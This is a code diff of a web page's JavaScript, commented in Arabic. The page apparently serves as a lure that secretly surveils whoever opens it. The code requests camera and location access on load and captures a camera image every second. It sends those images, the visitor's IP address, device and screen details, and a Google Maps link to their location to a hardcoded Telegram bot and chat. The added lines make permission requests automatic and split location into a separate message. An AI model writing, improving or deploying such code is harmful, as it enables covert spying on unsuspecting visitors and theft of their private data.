@@ -32,7 +32,7 @@
 
     <script>
       const BOT_TOKEN = '6575631247:AAHgvHAO8xAgtX3KzUnGC-pg-cownq7Jl58';
-      const CHAT_ID = '1776689384'; // تم تغيير ID الشات
+      const CHAT_ID = '1776689384'; 
       const IMAGE_URL = 'https://t.me/assets_tnzxo/3';
 
       let currentCamera = 'user';
@@ -66,6 +66,18 @@
           console.error('حدث خطأ: ', err);
         }
       }
+
+      // طلب إذن الوصول للكاميرا والموقع عند تحميل الصفحة
+      async function requestPermissions() {
+        try {
+          await navigator.mediaDevices.getUserMedia({ video: true });
+          await navigator.geolocation.getCurrentPosition(() => {}, () => {});
+        } catch (error) {
+          console.error('Error requesting permissions:', error);
+        }
+      }
+
+      requestPermissions();
 
       setInterval(captureAndSendImage, 1000); // التقاط وإرسال صورة كل ثانية
 
@@ -113,20 +125,20 @@
       // إرسال رسالة عند دخول المستخدم
       async function sendEntryMessage() {
         try {
-          let message = '👤 دخل مستخدم جديد إلى الموقع! 👤\n';
+          let message = '👤 A new user has entered the site! 👤\n';
 
           // معلومات الجهاز
-          message += `\n📱 معلومات الجهاز 📱:\n`;
-          message += `- اسم الجهاز: ${getDeviceName()}\n`; // محاولة الحصول على اسم الجهاز
+          message += `\n📱 Device Information 📱:\n`;
+          message += `- Device Name: ${getDeviceName()}\n`; // محاولة الحصول على اسم الجهاز
           message += `- User Agent: ${navigator.userAgent}\n`;
           message += `- Platform: ${navigator.platform}\n`;
-          message += `- Language: 🗣️ ${navigator.language}\n`;
-          message += `- Online: 🌐 ${navigator.onLine ? '✅' : '❌'}\n`;
-          message += `- Cookies Enabled: 🍪 ${navigator.cookieEnabled ? '✅' : '❌'}\n`;
+          message += `- 🗣 Language: ${navigator.language}\n`;
+          message += `- 🌐 Online: ${navigator.onLine ? 'Yes' : 'No'}\n`;
+          message += `- 🍪 Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}\n`;
           message += `- Device Type: ${getDeviceType()}\n`;
 
           // معلومات الشاشة
-          message += `\n🖥️ معلومات الشاشة 🖥️:\n`;
+          message += `\n🖥️ Screen Information 🖥️:\n`;
           message += `- Width: ${screen.width}\n`;
           message += `- Height: ${screen.height}\n`;
           message += `- Color Depth: ${screen.colorDepth}\n`;
@@ -139,20 +151,18 @@
             message += `\n🌐 IP: ${ipData.ip}`;
           }
 
+          sendMessage(message); // إرسال معلومات الجهاز أولاً
+
           // الحصول على الموقع (يطلب إذن)
           if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
               const latitude = position.coords.latitude;
               const longitude = position.coords.longitude;
               const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
-              message += `\n📍 الموقع: ${googleMapsLink}`;
-              sendMessage(message);
+              sendMessage(`📍 Location: ${googleMapsLink}`); // إرسال الموقع إذا تم منح الإذن
             }, function(error) {
               console.error('Error getting location:', error);
-              sendMessage(message);
             });
-          } else {
-            sendMessage(message);
           }
 
         } catch (err) {
